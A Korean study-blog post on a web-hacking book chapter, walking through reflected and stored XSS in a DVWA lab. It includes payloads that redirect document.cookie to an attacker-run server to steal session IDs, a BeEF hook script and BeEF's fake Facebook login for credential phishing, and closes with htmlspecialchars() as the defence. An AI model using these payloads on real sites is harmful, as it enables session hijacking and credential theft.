---
layout: post
category : Practice

---

--------------------------------------------------

<center style="color:red;">
!warning!<br>

본 게시글은 본인의 학습기록을 위해 작성된 알려진 학습 기법<br>

함부로 악의적으로 이용은 엄연히 불법 임으로<br>

절대 시도하지 말 것이며<br>

사고 발생 시 본인은 절대로 책임지지 않습니다!<br>
</center>

--------------------------------------------------

<div align="center" >
<img src="/Art of Web Hacking/Chapter9/Chapter9.png" width="400" height="300"> <br>
</div><br>


<center><font size="5em" color="#0091ff">Chapter 09. XSS 공격</font> </center>
<font size="3em" color="#0091ff">
<br>

-서버의 취약점을 이용하여 자바스크립트로 클라이언트 공격을<br> 의미합니다(ex:쿠키 탈취)<br>

-삽입한 코드가 언제 실행되는지에 따라 reflected 공격과 stored <br>공격으로 구분 가능

<center><font size="4em" color="#0091ff">리플렉티드 XSS 공격 개요</font> </center><br>

-요청 메시지에 입력된 스크립트 코드가 즉시 응답 메시지를 토해 출력되는 취약점,<br>
주로 게시판에 글을 남기거나 이메일 피싱을 이용하여 악의적인 스크립트 코드가 담긴<br>
요청을 사용자가 실행하도록 만듭니다.

<center><font size="4em" color="#0091ff">리플렉티드 XSS 공격 실습</font> </center><br>


<div align="center" >
<img src="/Art of Web Hacking/Chapter9/001.png" width="500" height="102"> <br>
</div>스샷. 1<br>

-빈칸에 입력된 이름이 바로 출력됨

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#010101">&lt;</span><span style="color:#066de2">script</span><span style="color:#010101">&gt;</span><span style="color:#066de2">alert</span>(<span style="color:#0099cc">1</span>)<span style="color:#010101">&lt;</span><span style="color:#010101">/</span><span style="color:#066de2">script</span><span style="color:#010101">&gt;</span></div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>
<br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter9/002.png" width="290" height="172"> <br>
</div>스샷. 2<br><br>
- 웹 애플리케이션이 사용자가 입력한 값을 그대로 출력하는 경우 리플렉티드 XSS가<br>
존재할 가능성이 놓습니다, 이를 테스트하기 위하여 스크립트 태그를 사용합니다.<br><br>

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#010101">&lt;</span><span style="color:#ff3399">script</span><span style="color:#010101">&gt;</span><span style="color:#0099cc">alert</span>(<span style="color:#0099cc">document</span>.cookie)<span style="color:#010101">&lt;</span><span style="color:#010101">/</span><span style="color:#ff3399">script</span><span style="color:#010101">&gt;</span></div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>
<br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter9/003.png" width="470" height="182"> <br>
</div>스샷. 3<br><br>

-쿠키를 출력하는 자바스크립트
<div  >
<img src="/Art of Web Hacking/Chapter9/004.png" width="325" height="25"> <br>
</div><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter9/005.png" width="520" height="390"> <br>
</div>스샷. 4-5<br>

-공격자의 웹 서버에 쿠키 값을 전달하기 위하여 웹 서버를 작동시킨 다음, 192.168으로 시작<br>

하는 IP 주소 가 확인됩니다.
<div align="center" >
<img src="/Art of Web Hacking/Chapter9/006.png" width="520" height="400"> <br>
</div>스샷. 6<br>

-주소창에 IP 주소로 웹 서버가 잘 돌아가는지 확인해봅니다.
<div align="center" >
<img src="/Art of Web Hacking/Chapter9/007.png" width="520" height="400"> <br>
</div>스샷. 7<br>
-access.log에는 웹 서버로 들어곤 요청 정보가 기록되고, tail 명령어는<br>
파일의 내용이 갱신되면새로 추가된 내용을 바로 출력해주는 명령어

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#010101">&lt;</span><span style="color:#ff3399">script</span><span style="color:#010101">&gt;</span><span style="color:#0099cc">document</span>.<span style="color:#0099cc">location</span><span style="color:#ff3399">=</span><span style="color:#993333">'http://192.168.37.130/cookie?'</span><span style="color:#039C43"></span><span style="color:#ff3399">+</span><span style="color:#0099cc">document</span>.cookie<span style="color:#010101">&lt;</span><span style="color:#010101">/</span><span style="color:#ff3399">script</span><span style="color:#010101">&gt;</span></div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>
<div align="center" >
<img src="/Art of Web Hacking/Chapter9/008.png" width="660" height="160"> <br>
</div><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter9/009.png" width="660" height="460"> <br>
</div>스샷. 8-9<br><br>
- 리다이렉트된 URL이 공격자의 호스트에 존재하지 않기 때문에 에러 발생, 무시해도 되고<br>
접근 로그에 GET /cookie? 문자열 이후 나오는 내용은 document cookie에 의해 출력된 쿠키 정보, PHPSESSIONID 쿠키 탈취 성공
<br><br>
<center><font size="4em" color="#0091ff">BeEF 공격 프레임워크</font> </center><br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter9/010.png" width="560" height="460"> <br>
</div>스샷. 8-9<br><br>
- BeEF는 브라우저 익스플로잇 프레임워크 프로그램으로,<br> <span style="color: #FFFFFF">~~사실상 해킹툴…~~</span>후킹 코드를 사용자가 실행하면 그<br> 사용자의 호스트를 대상으로 여러 가지 공격을 실행할 수 있도록 도움

<div align="center" >
<img src="/Art of Web Hacking/Chapter9/011.png" width="560" height="460"> <br>
</div>스샷. 10<br><br>
-웹 페이지가 자동으로 띄워짐, beef/beef로 로그인
<div align="center" >
<img src="/Art of Web Hacking/Chapter9/012.png" width="510" height="130"> <br>
</div>스샷. 11<br><br>
<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#010101">&lt;</span><span style="color:#ff3399">script</span>&nbsp;<span style="color:#0099cc">src</span>=<span style="color:#52be14">"http://127.0.0.1:3000/js"</span><span style="color:#ff3399"></span><span style="color:#010101">&gt;</span><span style="color:#010101">&lt;</span><span style="color:#010101">/</span><span style="color:#ff3399">script</span><span style="color:#010101">&gt;</span></div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>

-처음 실행될 때 확인한 후크 스크립트를 Vulnerability: Reflected Cross Site Scripting (XSS)<br>
에 입력하시면

<div align="center" >
<img src="/Art of Web Hacking/Chapter9/013.png" width="510" height="430"> <br>
</div>스샷. 12<br><br>
- Pretty Theft 기능은 SNS 사이트의 인터페이스를 모방하여 사용자가<br>
그 사이트의 아이디/패스워드를 입력하도록 유도<br><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter9/014.png" width="510" height="430"> <br>
</div><br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter9/015.png" width="510" height="430"> <br>
</div>스샷. 14-15<br><br>
-실행시키면 DVWA 사이트에 가짜 페이스북 인터페이가 출력됨
<br><br>

-로그인하면 그 데이터가 BeEF에 출력됩니다.
<br><br>

<center><font size="4em" color="#0091ff">스토어드 XSS 공격 실습</font> </center><br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter9/016.png" width="510" height="330"> <br>
</div><br><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter9/017.png" width="510" height="40"> <br>
</div>스샷. 16-17<br><br>
- 더 이상 입력이 안되 진행이 안된다면 Inspect Element 클릭하면 소스코드에서 maxlength가 50으로 설정되어 있으니까 원하는 값으로 바꿔 줍니다.<br>
<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#010101">&lt;</span><span style="color:#ff3399">script</span><span style="color:#010101">&gt;</span><span style="color:#0099cc">document</span>.<span style="color:#0099cc">location</span><span style="color:#ff3399">=</span>’http:<span style="color:#999999">//192.168.37.130/cookie?’+document.cookie&lt;/script&gt;</span></div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>
<br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter9/018.png" width="510" height="330"> <br>
</div><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter9/019.png" width="510" height="330"> <br>
</div>스샷. 18-19<br><br>

-access.log 파일을 확인해보면 쿠키 정보가 담긴 요청 기록이 새롭게 생성되었습니다,<br> 이후 방문자들 즉 타깃들은 모두 공격을 당하게 됩니다.
<center><font size="4em" color="#0091ff">스토어드 XSS 공격 대응</font> </center><br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter9/020.png" width="510" height="430"> <br>
</div>스샷. 20<br><br>

-htmlspecialchars() 함수는 특수문자들을 HTML 엔티티로 변환해주는 함수,<br>
리플렉티드 XSS 공격 역시 이와 같은 방법으로 대응할 수 있습니다.
<br>
<center>

==================================<br>

휴… 이제서야 챕터 9까지 작성했습니다 (´∀｀；)<br>

본인이 알기로는 이 실습·복습 책 이 챕터 18까지 인걸로<br>

압니다 언제 다 작성될까요 ㅋㅋㅋㅋㅋㅋ… {ō xō};<br>
<span style="color: #FFFFFF">
~~압니다 언제 다 작성될까요 ㅋㅋㅋㅋㅋㅋ… {ō xō};~~<br>
</span>

아무튼  긴 글을 읽어 주셔서 감사하고 남은 하루 잘 보내시고<br>

좋은 하루 되시고 하시는 일 다 잘 되시고 중국산 코로나 <br>조심하세요.(ㆁᴗㆁ✿)<br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter9/021.png" width="320" height="320"> <br>
</div>

</center>
